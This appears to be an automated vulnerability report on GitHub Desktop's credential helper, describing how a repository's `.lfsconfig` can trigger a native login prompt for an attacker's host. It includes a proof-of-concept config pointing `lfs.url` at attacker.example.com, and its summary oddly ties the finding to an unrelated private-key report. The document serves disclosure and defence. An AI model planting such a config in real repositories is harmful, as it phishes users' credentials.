## Title
Attacker-Controlled `.lfsconfig`/Remote URL Triggers a Native Desktop Credential Prompt for an Arbitrary Host, Enabling Credential Phishing/Exfiltration — (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`, `app/src/lib/trampoline/trampoline-environment.ts`)

### Summary
The external report's core issue is that a script broadcasts a transaction using a raw private key, exposing a secret to whatever untrusted context runs the script. The GitHub Desktop analog is the trampoline credential-helper: Desktop shares its credential-helper wiring (`GIT_CONFIG_PARAMETERS=credential.helper=desktop`, `DESKTOP_TRAMPOLINE_TOKEN`) with the *entire* Git process tree spawned for an operation — including Git LFS's smudge/clean filter subprocess, whose target URL (`lfs.url`) can be dictated by a file tracked *inside* the cloned repository (`.lfsconfig`). This lets a malicious repository force Desktop to pop its native "generic git credential" dialog for a host the attacker fully controls, during an ordinary `clone`/`fetch`/`checkout`, without the user having any indication that the prompt is unrelated to the repository they are actually working with.

### Finding Description
`withTrampolineEnv` deliberately exposes the credential-helper configuration via environment variables rather than command-line arguments specifically so that subprocesses spawned by filters such as Git LFS inherit it: [1](#0-0) 

Git LFS reads its transfer endpoint (`lfs.url`) from `.lfsconfig`, a file that is part of the repository's tracked content, so a malicious repository author fully controls which host Git LFS will authenticate against during checkout of LFS-tracked content: [2](#0-1) 

When the LFS smudge/clean subprocess needs credentials for that attacker-chosen host, it invokes `git credential fill`, which is routed to Desktop's trampoline credential helper because of the inherited `GIT_CONFIG_PARAMETERS`/`DESKTOP_TRAMPOLINE_TOKEN` env vars. Inside the helper, `getEndpointKind` classifies the host, and for anything that isn't recognized as GitHub.com/GHE it falls back to `'generic'`: [3](#0-2) 

For a `'generic'` endpoint with no stored credential, and when the operation is **not** flagged as a background task, Desktop shows a native authentication prompt seeded entirely with attacker-supplied data (the URL from `.lfsconfig`): [4](#0-3) 

Nothing in this path ties the prompted `endpoint` back to the repository/remote the user believes they are interacting with, and nothing warns the user that the credential request originates from a Git LFS filter rather than the actual clone/fetch target. Whatever the user enters is sent by Git LFS directly to the attacker-controlled `lfs.url` host, and is also persisted via `storeCredential`/`setGenericCredential` for future auto-fill: [5](#0-4) 

### Impact Explanation
An attacker who gets a victim to clone or fetch a repository (a completely ordinary, unprivileged Desktop action — no local access, malware, or social engineering beyond "clone this repo") can cause Desktop to display what looks like a legitimate credential prompt for a host of the attacker's choosing. Since GitHub Desktop's UI does not disambiguate "this dialog is for LFS host X, unrelated to the repo you cloned from Y," a user who enters credentials (e.g., because they mistake it for re-authenticating to the repo's real host, or because it looks identical to Desktop's normal auth flow) has those credentials sent straight to the attacker's server. This satisfies the "credential/token exfiltration" impact category: the attacker controls a cloned/fetched repository and the result is credential exfiltration through a trusted-looking Desktop UI element.

### Likelihood Explanation
This requires only that the victim clone/fetch a repository containing LFS-tracked paths and a crafted `.lfsconfig` pointing `lfs.url` at an attacker-controlled host — no interaction beyond a normal clone/checkout is needed to trigger the credential-fill request, since Git and Git LFS process `.lfsconfig`/smudge filters automatically as part of checkout. The only remaining variable is whether the user, seeing the prompt, decides to type credentials; this is a realistic phishing scenario since the dialog is rendered by Desktop itself (native prompt, not a webpage), lending it inherent trust.

### Recommendation
- Do not show `promptForGenericGitAuthentication` for hosts triggered from filter/LFS subprocess contexts without clearly surfacing that the request originates from a content filter and which repository/config value produced the target URL.
- Consider treating credential requests whose `endpoint` does not match the current repository's configured remote(s) as high-risk, and either block them, require explicit user confirmation naming the untrusted source (e.g. "`.lfsconfig` in repository X is requesting credentials for host Y"), or restrict LFS filter subprocesses from having access to the interactive/generic credential-prompt path (only allow the `'generic'` background-task no-prompt code path for such subprocesses).
- Consider pinning/verifying `lfs.url` against the repository's declared remote host before allowing an interactive credential prompt.

### Proof of Concept
1. Attacker creates a public repository, enables Git LFS for a file (e.g. `secret.bin`), and commits a `.lfsconfig`:
   ```
   [lfs]
     url = https://attacker.example.com/lfs
   ```
2. Victim clones the repository in GitHub Desktop (a normal, unprivileged action).
3. During checkout, Git invokes the LFS smudge filter for `secret.bin`; the filter subprocess inherits `GIT_CONFIG_PARAMETERS=credential.helper=desktop` and `DESKTOP_TRAMPOLINE_TOKEN` from Desktop's `withTrampolineEnv` (`app/src/lib/trampoline/trampoline-environment.ts:123-147`).
4. Git LFS runs `git credential fill` for `https://attacker.example.com/lfs`; the trampoline routes this to `createCredentialHelperTrampolineHandler` → `getCredential` → `getEndpointKind` (returns `'generic'`) → `getGenericCredential` → `promptForCredential` (`app/src/lib/trampoline/trampoline-credential-helper.ts:59-82,101-134`).
5. Desktop shows a native "Authenticate" dialog for `attacker.example.com`. If the victim enters credentials (mistaking it for a legitimate prompt related to the repo they just cloned), those credentials are transmitted by Git LFS directly to the attacker's server. [6](#0-5) [7](#0-6)

/** Implementation of the 'get' git credential helper command */
async function getCredential(cred: Credential, store: Store, token: string) {
  const ghCred = await getGitHubCredential(cred, store)

  if (ghCred) {
    return ghCred
  }

  const endpointKind = await getEndpointKind(cred, store)
  const accounts = await store.getAll()

  const endpoint = `${getCredentialUrl(cred)}`
  const apiEndpoint = getAPIEndpoint(endpoint)

  // If it appears as if the endpoint is a GitHub host and we don't have an
  // account for that endpoint then we should prompt the user to sign in.
  if (
    endpointKind !== 'generic' &&
    !accounts.some(a => a.endpoint === apiEndpoint)
  ) {
    if (getIsBackgroundTaskEnvironment(token)) {
      debug('background task environment, skipping prompt')
      return undefined
    }

    const account = await ui.promptForGitHubSignIn(endpoint)

    if (!account) {
      setHasRejectedCredentialsForEndpoint(token, endpoint)
    }

    return credWithAccount(cred, account)
  }

  // GitHub.com/GHE creds are only stored internally
  if (endpointKind !== 'generic') {
    return undefined
  }

  return useExternalCredentialHelper()
    ? getExternalCredential(cred, token)
    : getGenericCredential(cred, token)
}

const getEndpointKind = async (cred: Credential, store: Store) => {
  const credentialUrl = getCredentialUrl(cred)
  const endpoint = `${credentialUrl}`

  if (isGist(endpoint)) {
    return 'generic'
  }

  if (isDotCom(endpoint)) {
    return 'github.com'
  }

  if (isGHE(endpoint)) {
    return 'ghe.com'
  }

  // When Git attempts to authenticate with a host it captures any
  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }

  const existingAccount = await findGitHubTrampolineAccount(store, endpoint)
  if (existingAccount) {
    return isDotCom(existingAccount.endpoint) ? 'github.com' : 'enterprise'
  }

  // All GitHub hosts use HTTPS, so if the protocol is not HTTPS we can
  // assume that this is not a GitHub host.
  if (credentialUrl.protocol !== 'https:') {
    return 'generic'
  }

  return (await isGitHubHost(endpoint)) ? 'enterprise' : 'generic'
}

/** Implementation of the 'store' git credential helper command */
async function storeCredential(cred: Credential, store: Store, token: string) {
  if ((await getEndpointKind(cred, store)) !== 'generic') {
    return
  }

  return useExternalCredentialHelper()
    ? storeExternalCredential(cred, token)
    : setGenericCredential(
        urlWithoutCredentials(getCredentialUrl(cred)),
        forceUnwrap(`credential missing username`, cred.get('username')),
        forceUnwrap(`credential missing password`, cred.get('password'))
      )
}
